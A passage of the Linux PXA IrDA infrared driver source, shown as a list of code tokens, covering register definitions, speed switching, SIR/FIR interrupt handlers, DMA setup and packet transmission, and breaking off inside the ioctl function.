"Descriptor", "Chain", "*", "/", "#", "define", "ICSR0_FRE", "(", "1", "<", "<", "5", ")", "/", "*", "Framing", "error", "*", "/", "#", "define", "ICSR0_RFS", "(", "1", "<", "<", "4", ")", "/", "*", "Receive", "FIFO", "service", "request", "*", "/", "#", "define", "ICSR0_TFS", "(", "1", "<", "<", "3", ")", "/", "*", "Transnit", "FIFO", "service", "request", "*", "/", "#", "define", "ICSR0_RAB", "(", "1", "<", "<", "2", ")", "/", "*", "Receiver", "abort", "*", "/", "#", "define", "ICSR0_TUR", "(", "1", "<", "<", "1", ")", "/", "*", "Trunsmit", "FIFO", "underun", "*", "/", "#", "define", "ICSR0_EIF", "(", "1", "<", "<", "0", ")", "/", "*", "End", "/", "Error", "in", "FIFO", "*", "/", "#", "define", "ICSR1_ROR", "(", "1", "<", "<", "6", ")", "/", "*", "Receiver", "FIFO", "underrun", "*", "/", "#", "define", "ICSR1_CRE", "(", "1", "<", "<", "5", ")", "/", "*", "CRC", "error", "*", "/", "#", "define", "ICSR1_EOF", "(", "1", "<", "<", "4", ")", "/", "*", "End", "of", "frame", "*", "/", "#", "define", "ICSR1_TNF", "(", "1", "<", "<", "3", ")", "/", "*", "Transmit", "FIFO", "not", "full", "*", "/", "#", "define", "ICSR1_RNE", "(", "1", "<", "<", "2", ")", "/", "*", "Receive", "FIFO", "not", "empty", "*", "/", "#", "define", "ICSR1_TBY", "(", "1", "<", "<", "1", ")", "/", "*", "Tramsmiter", "busy", "flag", "*", "/", "#", "define", "ICSR1_RSY", "(", "1", "<", "<", "0", ")", "/", "*", "Recevier", "synchronized", "flag", "*", "/", "#", "define", "IrSR_RXPL_NEG_IS_ZERO", "(", "1", "<", "<", "4", ")", "#", "define", "IrSR_RXPL_POS_IS_ZERO", "0x0", "#", "define", "IrSR_TXPL_NEG_IS_ZERO", "(", "1", "<", "<", "3", ")", "#", "define", "IrSR_TXPL_POS_IS_ZERO", "0x0", "#", "define", "IrSR_XMODE_PULSE_1_6", "(", "1", "<", "<", "2", ")", "#", "define", "IrSR_XMODE_PULSE_3_16", "0x0", "#", "define", "IrSR_RCVEIR_IR_MODE", "(", "1", "<", "<", "1", ")", "#", "define", "IrSR_RCVEIR_UART_MODE", "0x0", "#", "define", "IrSR_XMITIR_IR_MODE", "(", "1", "<", "<", "0", ")", "#", "define", "IrSR_XMITIR_UART_MODE", "0x0", "#", "define", "IrSR_IR_RECEIVE_ON", "(", "\\", "IrSR_RXPL_NEG_IS_ZERO", "|", "\\", "IrSR_TXPL_POS_IS_ZERO", "|", "\\", "IrSR_XMODE_PULSE_3_16", "|", "\\", "IrSR_RCVEIR_IR_MODE", "|", "\\", "IrSR_XMITIR_UART_MODE", ")", "#", "define", "IrSR_IR_TRANSMIT_ON", "(", "\\", "IrSR_RXPL_NEG_IS_ZERO", "|", "\\", "IrSR_TXPL_POS_IS_ZERO", "|", "\\", "IrSR_XMODE_PULSE_3_16", "|", "\\", "IrSR_RCVEIR_UART_MODE", "|", "\\", "IrSR_XMITIR_IR_MODE", ")", "/", "*", "macros", "for", "registers", "read", "/", "write", "*", "/", "#", "define", "ficp_writel", "(", "irda", ",", "val", ",", "off", ")", "\\", "do", "{", "\\", "dev_vdbg", "(", "irda", "-", ">", "dev", ",", "\\", "\"", "%", "s", "(", "):", "%", "d", "ficp_writel", "(", "0x", "%", "x", ",", "%", "s", ")", "\\", "n", "\"", ",", "\\", "__func__", ",", "__LINE__", ",", "(", "val", ")", ",", "#", "off", ")", ";", "\\", "writel_relaxed", "(", "(", "val", ")", ",", "(", "irda", ")", "->", "irda_base", "+", "(", "off", ")", ");", "\\", "}", "while", "(", "0", ")", "#", "define", "ficp_readl", "(", "irda", ",", "off", ")", "\\", "(", "{", "\\", "unsigned", "int", "_v", ";", "\\", "_v", "=", "readl_relaxed", "(", "(", "irda", ")", "->", "irda_base", "+", "(", "off", ")", ");", "\\", "dev_vdbg", "(", "irda", "-", ">", "dev", ",", "\\", "\"", "%", "s", "(", "):", "%", "d", "ficp_readl", "(", "%", "s", ")", ":", "0x", "%", "x", "\\", "n", "\"", ",", "\\", "__func__", ",", "__LINE__", ",", "#", "off", ",", "_v", ")", ";", "\\", "_v", ";", "\\", "}", ")", "#", "define", "stuart_writel", "(", "irda", ",", "val", ",", "off", ")", "\\", "do", "{", "\\", "dev_vdbg", "(", "irda", "-", ">", "dev", ",", "\\", "\"", "%", "s", "(", "):", "%", "d", "stuart_writel", "(", "0x", "%", "x", ",", "%", "s", ")", "\\", "n", "\"", ",", "\\", "__func__", ",", "__LINE__", ",", "(", "val", ")", ",", "#", "off", ")", ";", "\\", "writel_relaxed", "(", "(", "val", ")", ",", "(", "irda", ")", "->", "stuart_base", "+", "(", "off", ")", ");", "\\", "}", "while", "(", "0", ")", "#", "define", "stuart_readl", "(", "irda", ",", "off", ")", "\\", "(", "{", "\\", "unsigned", "int", "_v", ";", "\\", "_v", "=", "readl_relaxed", "(", "(", "irda", ")", "->", "stuart_base", "+", "(", "off", ")", ");", "\\", "dev_vdbg", "(", "irda", "-", ">", "dev", ",", "\\", "\"", "%", "s", "(", "):", "%", "d", "stuart_readl", "(", "%", "s", ")", ":", "0x", "%", "x", "\\", "n", "\"", ",", "\\", "__func__", ",", "__LINE__", ",", "#", "off", ",", "_v", ")", ";", "\\", "_v", ";", "\\", "}", ")", "struct", "pxa_irda", "{", "int", "speed", ";", "int", "newspeed", ";", "unsigned", "long", "long", "last_clk", ";", "void", "__iomem", "*", "stuart_base", ";", "void", "__iomem", "*", "irda_base", ";", "unsigned", "char", "*", "dma_rx_buff", ";", "unsigned", "char", "*", "dma_tx_buff", ";", "dma_addr_t", "dma_rx_buff_phy", ";", "dma_addr_t", "dma_tx_buff_phy", ";", "unsigned", "int", "dma_tx_buff_len", ";", "struct", "dma_chan", "*", "txdma", ";", "struct", "dma_chan", "*", "rxdma", ";", "dma_cookie_t", "rx_cookie", ";", "dma_cookie_t", "tx_cookie", ";", "int", "drcmr_rx", ";", "int", "drcmr_tx", ";", "int", "uart_irq", ";", "int", "icp_irq", ";", "struct", "irlap_cb", "*", "irlap", ";", "struct", "qos_info", "qos", ";", "iobuff_t", "tx_buff", ";", "iobuff_t", "rx_buff", ";", "struct", "device", "*", "dev", ";", "struct", "pxaficp_platform_data", "*", "pdata", ";", "struct", "clk", "*", "fir_clk", ";", "struct", "clk", "*", "sir_clk", ";", "struct", "clk", "*", "cur_clk", ";", "}", ";", "static", "int", "pxa_irda_set_speed", "(", "struct", "pxa_irda", "*", "si", ",", "int", "speed", ")", ";", "static", "inline", "void", "pxa_irda_disable_clk", "(", "struct", "pxa_irda", "*", "si", ")", "{", "if", "(", "si", "-", ">", "cur_clk", ")", "clk_disable_unprepare", "(", "si", "-", ">", "cur_clk", ")", ";", "si", "-", ">", "cur_clk", "=", "NULL", ";", "}", "static", "inline", "void", "pxa_irda_enable_firclk", "(", "struct", "pxa_irda", "*", "si", ")", "{", "si", "-", ">", "cur_clk", "=", "si", "-", ">", "fir_clk", ";", "clk_prepare_enable", "(", "si", "-", ">", "fir_clk", ")", ";", "}", "static", "inline", "void", "pxa_irda_enable_sirclk", "(", "struct", "pxa_irda", "*", "si", ")", "{", "si", "-", ">", "cur_clk", "=", "si", "-", ">", "sir_clk", ";", "clk_prepare_enable", "(", "si", "-", ">", "sir_clk", ")", ";", "}", "#", "define", "IS_FIR", "(", "si", ")", "(", "(", "si", ")", "->", "speed", ">", "=", "4000000", ")", "#", "define", "IRDA_FRAME_SIZE_LIMIT", "2047", "static", "void", "pxa_irda_fir_dma_rx_irq", "(", "void", "*", "data", ")", ";", "static", "void", "pxa_irda_fir_dma_tx_irq", "(", "void", "*", "data", ")", ";", "inline", "static", "void", "pxa_irda_fir_dma_rx_start", "(", "struct", "pxa_irda", "*", "si", ")", "{", "struct", "dma_async_tx_descriptor", "*", "tx", ";", "tx", "=", "dmaengine_prep_slave_single", "(", "si", "-", ">", "rxdma", ",", "si", "-", ">", "dma_rx_buff_phy", ",", "IRDA_FRAME_SIZE_LIMIT", ",", "DMA_FROM_DEVICE", ",", "DMA_PREP_INTERRUPT", ")", ";", "if", "(", "!", "tx", ")", "{", "dev_err", "(", "si", "-", ">", "dev", ",", "\"", "prep_slave_sg", "(", ")", "failed", "\\", "n", "\"", ");", "return", ";", "}", "tx", "-", ">", "callback", "=", "pxa_irda_fir_dma_rx_irq", ";", "tx", "-", ">", "callback_param", "=", "si", ";", "si", "-", ">", "rx_cookie", "=", "dmaengine_submit", "(", "tx", ")", ";", "dma_async_issue_pending", "(", "si", "-", ">", "rxdma", ")", ";", "}", "inline", "static", "void", "pxa_irda_fir_dma_tx_start", "(", "struct", "pxa_irda", "*", "si", ")", "{", "struct", "dma_async_tx_descriptor", "*", "tx", ";", "tx", "=", "dmaengine_prep_slave_single", "(", "si", "-", ">", "txdma", ",", "si", "-", ">", "dma_tx_buff_phy", ",", "si", "-", ">", "dma_tx_buff_len", ",", "DMA_TO_DEVICE", ",", "DMA_PREP_INTERRUPT", ")", ";", "if", "(", "!", "tx", ")", "{", "dev_err", "(", "si", "-", ">", "dev", ",", "\"", "prep_slave_sg", "(", ")", "failed", "\\", "n", "\"", ");", "return", ";", "}", "tx", "-", ">", "callback", "=", "pxa_irda_fir_dma_tx_irq", ";", "tx", "-", ">", "callback_param", "=", "si", ";", "si", "-", ">", "tx_cookie", "=", "dmaengine_submit", "(", "tx", ")", ";", "dma_async_issue_pending", "(", "si", "-", ">", "rxdma", ")", ";", "}", "/", "*", "*", "Set", "the", "IrDA", "communications", "mode", ".", "*", "/", "static", "void", "pxa_irda_set_mode", "(", "struct", "pxa_irda", "*", "si", ",", "int", "mode", ")", "{", "if", "(", "si", "-", ">", "pdata", "-", ">", "transceiver_mode", ")", "si", "-", ">", "pdata", "-", ">", "transceiver_mode", "(", "si", "-", ">", "dev", ",", "mode", ")", ";", "else", "{", "if", "(", "gpio_is_valid", "(", "si", "-", ">", "pdata", "-", ">", "gpio_pwdown", ")", ")", "gpio_set_value", "(", "si", "-", ">", "pdata", "-", ">", "gpio_pwdown", ",", "!", "(", "mode", "&", "IR_OFF", ")", "^", "!", "si", "-", ">", "pdata", "-", ">", "gpio_pwdown_inverted", ")", ";", "pxa2xx_transceiver_mode", "(", "si", "-", ">", "dev", ",", "mode", ")", ";", "}", "}", "/", "*", "*", "Set", "the", "IrDA", "communications", "speed", ".", "*", "/", "static", "int", "pxa_irda_set_speed", "(", "struct", "pxa_irda", "*", "si", ",", "int", "speed", ")", "{", "unsigned", "long", "flags", ";", "unsigned", "int", "divisor", ";", "switch", "(", "speed", ")", "{", "case", "9600", ":", "case", "19200", ":", "case", "38400", ":", "case", "57600", ":", "case", "115200", ":", "/", "*", "refer", "to", "PXA250", "/", "210", "Developer", "'", "s", "Manual", "10", "-", "7", "*", "/", "/", "*", "BaudRate", "=", "14", ".", "7456", "MHz", "/", "(", "16", "*", "Divisor", ")", "*", "/", "divisor", "=", "14745600", "/", "(", "16", "*", "speed", ")", ";", "local_irq_save", "(", "flags", ")", ";", "if", "(", "IS_FIR", "(", "si", ")", ")", "{", "/", "*", "stop", "RX", "DMA", "*", "/", "dmaengine_terminate_all", "(", "si", "-", ">", "rxdma", ")", ";", "/", "*", "disable", "FICP", "*", "/", "ficp_writel", "(", "si", ",", "0", ",", "ICCR0", ")", ";", "pxa_irda_disable_clk", "(", "si", ")", ";", "/", "*", "set", "board", "transceiver", "to", "SIR", "mode", "*", "/", "pxa_irda_set_mode", "(", "si", ",", "IR_SIRMODE", ")", ";", "/", "*", "enable", "the", "STUART", "clock", "*", "/", "pxa_irda_enable_sirclk", "(", "si", ")", ";", "}", "/", "*", "disable", "STUART", "first", "*", "/", "stuart_writel", "(", "si", ",", "0", ",", "STIER", ")", ";", "/", "*", "access", "DLL", "&", "DLH", "*", "/", "stuart_writel", "(", "si", ",", "stuart_readl", "(", "si", ",", "STLCR", ")", "|", "LCR_DLAB", ",", "STLCR", ")", ";", "stuart_writel", "(", "si", ",", "divisor", "&", "0xff", ",", "STDLL", ")", ";", "stuart_writel", "(", "si", ",", "divisor", ">", ">", "8", ",", "STDLH", ")", ";", "stuart_writel", "(", "si", ",", "stuart_readl", "(", "si", ",", "STLCR", ")", "&", "~", "LCR_DLAB", ",", "STLCR", ")", ";", "si", "-", ">", "speed", "=", "speed", ";", "stuart_writel", "(", "si", ",", "IrSR_IR_RECEIVE_ON", "|", "IrSR_XMODE_PULSE_1_6", ",", "STISR", ")", ";", "stuart_writel", "(", "si", ",", "IER_UUE", "|", "IER_RLSE", "|", "IER_RAVIE", "|", "IER_RTIOE", ",", "STIER", ")", ";", "local_irq_restore", "(", "flags", ")", ";", "break", ";", "case", "4000000", ":", "local_irq_save", "(", "flags", ")", ";", "/", "*", "disable", "STUART", "*", "/", "stuart_writel", "(", "si", ",", "0", ",", "STIER", ")", ";", "stuart_writel", "(", "si", ",", "0", ",", "STISR", ")", ";", "pxa_irda_disable_clk", "(", "si", ")", ";", "/", "*", "disable", "FICP", "first", "*", "/", "ficp_writel", "(", "si", ",", "0", ",", "ICCR0", ")", ";", "/", "*", "set", "board", "transceiver", "to", "FIR", "mode", "*", "/", "pxa_irda_set_mode", "(", "si", ",", "IR_FIRMODE", ")", ";", "/", "*", "enable", "the", "FICP", "clock", "*", "/", "pxa_irda_enable_firclk", "(", "si", ")", ";", "si", "-", ">", "speed", "=", "speed", ";", "pxa_irda_fir_dma_rx_start", "(", "si", ")", ";", "ficp_writel", "(", "si", ",", "ICCR0_ITR", "|", "ICCR0_RXE", ",", "ICCR0", ")", ";", "local_irq_restore", "(", "flags", ")", ";", "break", ";", "default", ":", "return", "-", "EINVAL", ";", "}", "return", "0", ";", "}", "/", "*", "SIR", "interrupt", "service", "routine", ".", "*", "/", "static", "irqreturn_t", "pxa_irda_sir_irq", "(", "int", "irq", ",", "void", "*", "dev_id", ")", "{", "struct", "net_device", "*", "dev", "=", "dev_id", ";", "struct", "pxa_irda", "*", "si", "=", "netdev_priv", "(", "dev", ")", ";", "int", "iir", ",", "lsr", ",", "data", ";", "iir", "=", "stuart_readl", "(", "si", ",", "STIIR", ")", ";", "switch", "(", "iir", "&", "0x0F", ")", "{", "case", "0x06", ":", "/", "*", "Receiver", "Line", "Status", "*", "/", "lsr", "=", "stuart_readl", "(", "si", ",", "STLSR", ")", ";", "while", "(", "lsr", "&", "LSR_FIFOE", ")", "{", "data", "=", "stuart_readl", "(", "si", ",", "STRBR", ")", ";", "if", "(", "lsr", "&", "(", "LSR_OE", "|", "LSR_PE", "|", "LSR_FE", "|", "LSR_BI", ")", ")", "{", "printk", "(", "KERN_DEBUG", "\"", "pxa_ir", ":", "sir", "receiving", "error", "\\", "n", "\"", ");", "dev", "-", ">", "stats", ".", "rx_errors", "+", "+;", "if", "(", "lsr", "&", "LSR_FE", ")", "dev", "-", ">", "stats", ".", "rx_frame_errors", "+", "+;", "if", "(", "lsr", "&", "LSR_OE", ")", "dev", "-", ">", "stats", ".", "rx_fifo_errors", "+", "+;", "}", "else", "{", "dev", "-", ">", "stats", ".", "rx_bytes", "+", "+;", "async_unwrap_char", "(", "dev", ",", "&", "dev", "-", ">", "stats", ",", "&", "si", "-", ">", "rx_buff", ",", "data", ")", ";", "}", "lsr", "=", "stuart_readl", "(", "si", ",", "STLSR", ")", ";", "}", "si", "-", ">", "last_clk", "=", "sched_clock", "(", ");", "break", ";", "case", "0x04", ":", "/", "*", "Received", "Data", "Available", "*", "/", "/", "*", "forth", "through", "*", "/", "case", "0x0C", ":", "/", "*", "Character", "Timeout", "Indication", "*", "/", "do", "{", "dev", "-", ">", "stats", ".", "rx_bytes", "+", "+;", "async_unwrap_char", "(", "dev", ",", "&", "dev", "-", ">", "stats", ",", "&", "si", "-", ">", "rx_buff", ",", "stuart_readl", "(", "si", ",", "STRBR", ")", ");", "}", "while", "(", "stuart_readl", "(", "si", ",", "STLSR", ")", "&", "LSR_DR", ")", ";", "si", "-", ">", "last_clk", "=", "sched_clock", "(", ");", "break", ";", "case", "0x02", ":", "/", "*", "Transmit", "FIFO", "Data", "Request", "*", "/", "while", "(", "(", "si", "-", ">", "tx_buff", ".", "len", ")", "&", "&", "(", "stuart_readl", "(", "si", ",", "STLSR", ")", "&", "LSR_TDRQ", ")", ")", "{", "stuart_writel", "(", "si", ",", "*", "si", "-", ">", "tx_buff", ".", "data", "+", "+,", "STTHR", ")", ";", "si", "-", ">", "tx_buff", ".", "len", "-", "=", "1", ";", "}", "if", "(", "si", "-", ">", "tx_buff", ".", "len", "=", "=", "0", ")", "{", "dev", "-", ">", "stats", ".", "tx_packets", "+", "+;", "dev", "-", ">", "stats", ".", "tx_bytes", "+", "=", "si", "-", ">", "tx_buff", ".", "data", "-", "si", "-", ">", "tx_buff", ".", "head", ";", "/", "*", "We", "need", "to", "ensure", "that", "the", "transmitter", "has", "finished", ".", "*", "/", "while", "(", "(", "stuart_readl", "(", "si", ",", "STLSR", ")", "&", "LSR_TEMT", ")", "=", "=", "0", ")", "cpu_relax", "(", ");", "si", "-", ">", "last_clk", "=", "sched_clock", "(", ");", "/", "*", "*", "Ok", ",", "we", "'", "ve", "finished", "transmitting", ".", "Now", "enable", "*", "the", "receiver", ".", "Sometimes", "we", "get", "a", "receive", "IRQ", "*", "immediately", "after", "a", "transmit", ".", "..", "*", "/", "if", "(", "si", "-", ">", "newspeed", ")", "{", "pxa_irda_set_speed", "(", "si", ",", "si", "-", ">", "newspeed", ")", ";", "si", "-", ">", "newspeed", "=", "0", ";", "}", "else", "{", "/", "*", "enable", "IR", "Receiver", ",", "disable", "IR", "Transmitter", "*", "/", "stuart_writel", "(", "si", ",", "IrSR_IR_RECEIVE_ON", "|", "IrSR_XMODE_PULSE_1_6", ",", "STISR", ")", ";", "/", "*", "enable", "STUART", "and", "receive", "interrupts", "*", "/", "stuart_writel", "(", "si", ",", "IER_UUE", "|", "IER_RLSE", "|", "IER_RAVIE", "|", "IER_RTIOE", ",", "STIER", ")", ";", "}", "/", "*", "I", "'", "m", "hungry", "!", "*", "/", "netif_wake_queue", "(", "dev", ")", ";", "}", "break", ";", "}", "return", "IRQ_HANDLED", ";", "}", "/", "*", "FIR", "Receive", "DMA", "interrupt", "handler", "*", "/", "static", "void", "pxa_irda_fir_dma_rx_irq", "(", "void", "*", "data", ")", "{", "struct", "net_device", "*", "dev", "=", "data", ";", "struct", "pxa_irda", "*", "si", "=", "netdev_priv", "(", "dev", ")", ";", "dmaengine_terminate_all", "(", "si", "-", ">", "rxdma", ")", ";", "netdev_dbg", "(", "dev", ",", "\"", "pxa_ir", ":", "fir", "rx", "dma", "bus", "error", "\\", "n", "\"", ");", "}", "/", "*", "FIR", "Transmit", "DMA", "interrupt", "handler", "*", "/", "static", "void", "pxa_irda_fir_dma_tx_irq", "(", "void", "*", "data", ")", "{", "struct", "net_device", "*", "dev", "=", "data", ";", "struct", "pxa_irda", "*", "si", "=", "netdev_priv", "(", "dev", ")", ";", "dmaengine_terminate_all", "(", "si", "-", ">", "txdma", ")", ";", "if", "(", "dmaengine_tx_status", "(", "si", "-", ">", "txdma", ",", "si", "-", ">", "tx_cookie", ",", "NULL", ")", "=", "=", "DMA_ERROR", ")", "{", "dev", "-", ">", "stats", ".", "tx_errors", "+", "+;", "}", "else", "{", "dev", "-", ">", "stats", ".", "tx_packets", "+", "+;", "dev", "-", ">", "stats", ".", "tx_bytes", "+", "=", "si", "-", ">", "dma_tx_buff_len", ";", "}", "while", "(", "ficp_readl", "(", "si", ",", "ICSR1", ")", "&", "ICSR1_TBY", ")", "cpu_relax", "(", ");", "si", "-", ">", "last_clk", "=", "sched_clock", "(", ");", "/", "*", "*", "HACK", ":", "It", "looks", "like", "the", "TBY", "bit", "is", "dropped", "too", "soon", ".", "*", "Without", "this", "delay", "things", "break", ".", "*", "/", "udelay", "(", "120", ")", ";", "if", "(", "si", "-", ">", "newspeed", ")", "{", "pxa_irda_set_speed", "(", "si", ",", "si", "-", ">", "newspeed", ")", ";", "si", "-", ">", "newspeed", "=", "0", ";", "}", "else", "{", "int", "i", "=", "64", ";", "ficp_writel", "(", "si", ",", "0", ",", "ICCR0", ")", ";", "pxa_irda_fir_dma_rx_start", "(", "si", ")", ";", "while", "(", "(", "ficp_readl", "(", "si", ",", "ICSR1", ")", "&", "ICSR1_RNE", ")", "&", "&", "i", "-", "-)", "ficp_readl", "(", "si", ",", "ICDR", ")", ";", "ficp_writel", "(", "si", ",", "ICCR0_ITR", "|", "ICCR0_RXE", ",", "ICCR0", ")", ";", "if", "(", "i", "<", "0", ")", "printk", "(", "KERN_ERR", "\"", "pxa_ir", ":", "cannot", "clear", "Rx", "FIFO", "!", "\\", "n", "\"", ");", "}", "netif_wake_queue", "(", "dev", ")", ";", "}", "/", "*", "EIF", "(", "Error", "in", "FIFO", "/", "End", "in", "Frame", ")", "handler", "for", "FIR", "*", "/", "static", "void", "pxa_irda_fir_irq_eif", "(", "struct", "pxa_irda", "*", "si", ",", "struct", "net_device", "*", "dev", ",", "int", "icsr0", ")", "{", "unsigned", "int", "len", ",", "stat", ",", "data", ";", "struct", "dma_tx_state", "state", ";", "/", "*", "Get", "the", "current", "data", "position", ".", "*", "/", "dmaengine_tx_status", "(", "si", "-", ">", "rxdma", ",", "si", "-", ">", "rx_cookie", ",", "&", "state", ")", ";", "len", "=", "IRDA_FRAME_SIZE_LIMIT", "-", "state", ".", "residue", ";", "do", "{", "/", "*", "Read", "Status", ",", "and", "then", "Data", ".", "*", "/", "stat", "=", "ficp_readl", "(", "si", ",", "ICSR1", ")", ";", "rmb", "(", ");", "data", "=", "ficp_readl", "(", "si", ",", "ICDR", ")", ";", "if", "(", "stat", "&", "(", "ICSR1_CRE", "|", "ICSR1_ROR", ")", ")", "{", "dev", "-", ">", "stats", ".", "rx_errors", "+", "+;", "if", "(", "stat", "&", "ICSR1_CRE", ")", "{", "printk", "(", "KERN_DEBUG", "\"", "pxa_ir", ":", "fir", "receive", "CRC", "error", "\\", "n", "\"", ");", "dev", "-", ">", "stats", ".", "rx_crc_errors", "+", "+;", "}", "if", "(", "stat", "&", "ICSR1_ROR", ")", "{", "printk", "(", "KERN_DEBUG", "\"", "pxa_ir", ":", "fir", "receive", "overrun", "\\", "n", "\"", ");", "dev", "-", ">", "stats", ".", "rx_over_errors", "+", "+;", "}", "}", "else", "{", "si", "-", ">", "dma_rx_buff", "[", "len", "+", "+]", "=", "data", ";", "}", "/", "*", "If", "we", "hit", "the", "end", "of", "frame", ",", "there", "'", "s", "no", "point", "in", "continuing", ".", "*", "/", "if", "(", "stat", "&", "ICSR1_EOF", ")", "break", ";", "}", "while", "(", "ficp_readl", "(", "si", ",", "ICSR0", ")", "&", "ICSR0_EIF", ")", ";", "if", "(", "stat", "&", "ICSR1_EOF", ")", "{", "/", "*", "end", "of", "frame", ".", "*", "/", "struct", "sk_buff", "*", "skb", ";", "if", "(", "icsr0", "&", "ICSR0_FRE", ")", "{", "printk", "(", "KERN_ERR", "\"", "pxa_ir", ":", "dropping", "erroneous", "frame", "\\", "n", "\"", ");", "dev", "-", ">", "stats", ".", "rx_dropped", "+", "+;", "return", ";", "}", "skb", "=", "alloc_skb", "(", "len", "+", "1", ",", "GFP_ATOMIC", ")", ";", "if", "(", "!", "skb", ")", "{", "printk", "(", "KERN_ERR", "\"", "pxa_ir", ":", "fir", "out", "of", "memory", "for", "receive", "skb", "\\", "n", "\"", ");", "dev", "-", ">", "stats", ".", "rx_dropped", "+", "+;", "return", ";", "}", "/", "*", "Align", "IP", "header", "to", "20", "bytes", "*", "/", "skb_reserve", "(", "skb", ",", "1", ")", ";", "skb_copy_to_linear_data", "(", "skb", ",", "si", "-", ">", "dma_rx_buff", ",", "len", ")", ";", "skb_put", "(", "skb", ",", "len", ")", ";", "/", "*", "Feed", "it", "to", "IrLAP", "*", "/", "skb", "-", ">", "dev", "=", "dev", ";", "skb_reset_mac_header", "(", "skb", ")", ";", "skb", "-", ">", "protocol", "=", "htons", "(", "ETH_P_IRDA", ")", ";", "netif_rx", "(", "skb", ")", ";", "dev", "-", ">", "stats", ".", "rx_packets", "+", "+;", "dev", "-", ">", "stats", ".", "rx_bytes", "+", "=", "len", ";", "}", "}", "/", "*", "FIR", "interrupt", "handler", "*", "/", "static", "irqreturn_t", "pxa_irda_fir_irq", "(", "int", "irq", ",", "void", "*", "dev_id", ")", "{", "struct", "net_device", "*", "dev", "=", "dev_id", ";", "struct", "pxa_irda", "*", "si", "=", "netdev_priv", "(", "dev", ")", ";", "int", "icsr0", ",", "i", "=", "64", ";", "/", "*", "stop", "RX", "DMA", "*", "/", "dmaengine_terminate_all", "(", "si", "-", ">", "rxdma", ")", ";", "si", "-", ">", "last_clk", "=", "sched_clock", "(", ");", "icsr0", "=", "ficp_readl", "(", "si", ",", "ICSR0", ")", ";", "if", "(", "icsr0", "&", "(", "ICSR0_FRE", "|", "ICSR0_RAB", ")", ")", "{", "if", "(", "icsr0", "&", "ICSR0_FRE", ")", "{", "printk", "(", "KERN_DEBUG", "\"", "pxa_ir", ":", "fir", "receive", "frame", "error", "\\", "n", "\"", ");", "dev", "-", ">", "stats", ".", "rx_frame_errors", "+", "+;", "}", "else", "{", "printk", "(", "KERN_DEBUG", "\"", "pxa_ir", ":", "fir", "receive", "abort", "\\", "n", "\"", ");", "dev", "-", ">", "stats", ".", "rx_errors", "+", "+;", "}", "ficp_writel", "(", "si", ",", "icsr0", "&", "(", "ICSR0_FRE", "|", "ICSR0_RAB", ")", ",", "ICSR0", ")", ";", "}", "if", "(", "icsr0", "&", "ICSR0_EIF", ")", "{", "/", "*", "An", "error", "in", "FIFO", "occurred", ",", "or", "there", "is", "a", "end", "of", "frame", "*", "/", "pxa_irda_fir_irq_eif", "(", "si", ",", "dev", ",", "icsr0", ")", ";", "}", "ficp_writel", "(", "si", ",", "0", ",", "ICCR0", ")", ";", "pxa_irda_fir_dma_rx_start", "(", "si", ")", ";", "while", "(", "(", "ficp_readl", "(", "si", ",", "ICSR1", ")", "&", "ICSR1_RNE", ")", "&", "&", "i", "-", "-)", "ficp_readl", "(", "si", ",", "ICDR", ")", ";", "ficp_writel", "(", "si", ",", "ICCR0_ITR", "|", "ICCR0_RXE", ",", "ICCR0", ")", ";", "if", "(", "i", "<", "0", ")", "printk", "(", "KERN_ERR", "\"", "pxa_ir", ":", "cannot", "clear", "Rx", "FIFO", "!", "\\", "n", "\"", ");", "return", "IRQ_HANDLED", ";", "}", "/", "*", "hard_xmit", "interface", "of", "irda", "device", "*", "/", "static", "int", "pxa_irda_hard_xmit", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "dev", ")", "{", "struct", "pxa_irda", "*", "si", "=", "netdev_priv", "(", "dev", ")", ";", "int", "speed", "=", "irda_get_next_speed", "(", "skb", ")", ";", "/", "*", "*", "Does", "this", "packet", "contain", "a", "request", "to", "change", "the", "interface", "*", "speed", "?", "If", "so", ",", "remember", "it", "until", "we", "complete", "the", "transmission", "*", "of", "this", "frame", ".", "*", "/", "if", "(", "speed", "!", "=", "si", "-", ">", "speed", "&", "&", "speed", "!", "=", "-", "1", ")", "si", "-", ">", "newspeed", "=", "speed", ";", "/", "*", "*", "If", "this", "is", "an", "empty", "frame", ",", "we", "can", "bypass", "a", "lot", ".", "*", "/", "if", "(", "skb", "-", ">", "len", "=", "=", "0", ")", "{", "if", "(", "si", "-", ">", "newspeed", ")", "{", "si", "-", ">", "newspeed", "=", "0", ";", "pxa_irda_set_speed", "(", "si", ",", "speed", ")", ";", "}", "dev_kfree_skb", "(", "skb", ")", ";", "return", "NETDEV_TX_OK", ";", "}", "netif_stop_queue", "(", "dev", ")", ";", "if", "(", "!", "IS_FIR", "(", "si", ")", ")", "{", "si", "-", ">", "tx_buff", ".", "data", "=", "si", "-", ">", "tx_buff", ".", "head", ";", "si", "-", ">", "tx_buff", ".", "len", "=", "async_wrap_skb", "(", "skb", ",", "si", "-", ">", "tx_buff", ".", "data", ",", "si", "-", ">", "tx_buff", ".", "truesize", ")", ";", "/", "*", "Disable", "STUART", "interrupts", "and", "switch", "to", "transmit", "mode", ".", "*", "/", "stuart_writel", "(", "si", ",", "0", ",", "STIER", ")", ";", "stuart_writel", "(", "si", ",", "IrSR_IR_TRANSMIT_ON", "|", "IrSR_XMODE_PULSE_1_6", ",", "STISR", ")", ";", "/", "*", "enable", "STUART", "and", "transmit", "interrupts", "*", "/", "stuart_writel", "(", "si", ",", "IER_UUE", "|", "IER_TIE", ",", "STIER", ")", ";", "}", "else", "{", "unsigned", "long", "mtt", "=", "irda_get_mtt", "(", "skb", ")", ";", "si", "-", ">", "dma_tx_buff_len", "=", "skb", "-", ">", "len", ";", "skb_copy_from_linear_data", "(", "skb", ",", "si", "-", ">", "dma_tx_buff", ",", "skb", "-", ">", "len", ")", ";", "if", "(", "mtt", ")", "while", "(", "(", "sched_clock", "(", ")", "-", "si", "-", ">", "last_clk", ")", "*", "1000", "<", "mtt", ")", "cpu_relax", "(", ");", "/", "*", "stop", "RX", "DMA", ",", "disable", "FICP", "*", "/", "dmaengine_terminate_all", "(", "si", "-", ">", "rxdma", ")", ";", "ficp_writel", "(", "si", ",", "0", ",", "ICCR0", ")", ";", "pxa_irda_fir_dma_tx_start", "(", "si", ")", ";", "ficp_writel", "(", "si", ",", "ICCR0_ITR", "|", "ICCR0_TXE", ",", "ICCR0", ")", ";", "}", "dev_kfree_skb", "(", "skb", ")", ";", "return", "NETDEV_TX_OK", ";", "}", "static", "int", "pxa_irda_ioctl", "(", "struct", "net_device", "*", "dev", ",", "struct", "ifreq", "*", "ifreq", ",", "int", "cmd", ")", "{", "struct", "if_irda_req", "*", "rq", "=", "(", 